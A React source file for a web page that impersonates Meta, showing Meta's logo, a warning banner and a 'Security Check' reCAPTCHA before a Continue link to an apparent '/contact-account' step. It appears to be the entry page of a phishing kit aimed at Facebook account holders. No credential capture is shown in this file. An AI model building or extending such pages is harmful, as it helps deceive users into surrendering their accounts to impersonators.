import React, { useRef, useState } from 'react'
import { Link } from 'react-router-dom'
import { meta, waring_backup } from './Publics/images/images'
import ReCAPTCHA from 'react-google-recaptcha';

const Form = () => {

    const recaptchaRef = useRef(null);
    const [isActive, setIsActive] = useState(false);

    const handleRecaptchaVerify = () => {
        
        setIsActive(true); 
        
    };

    
    return (
        
        <div className="main">

            <div className="container">
                <div className="thumnail col-md-6 col-12">
                    <div className="content">
                        <img src={waring_backup} width="100%" alt=""/>
                        
                        <div className="logo col-md-3 col-5" style={{margin: "1rem auto 3rem auto"}}>
                            <img src={meta} width="100%" alt=""/>
                        </div>

                        <h3><b>Security Check</b></h3>
                        <p>Meta uses security tests to ensure that the people on the site are real. Please fill the security check below to continue further.</p>

                    </div>
                </div>
                <div className="recapcha">
                    <ReCAPTCHA
                        ref={recaptchaRef}
                        sitekey="6Lc_GBApAAAAAB1X-h805S1053E3nIbIyLlAAjG_"
                        onChange={handleRecaptchaVerify}
                    />
                </div>
                <div className={`button col-md-7 col-12 ${isActive === true ? 'active' : ''}`}>
                    <Link to={`${isActive === true ? '/contact-account/firt-step' : ''}`}>Continue</Link>
                </div>
            </div>

            <div className="footer">
                <Link to="/https://www.facebook.com/legal/terms?paipv=0&eav=AfZ-n0rF_sl3GP74yuYqcJAuMjtNpTHfUcnbG6w6xeh0GTLwLIRte40HvdraKz052z0&_rdr">Terms of Service © 2023</Link>
            </div>
            
        </div>

    )
}

export default Form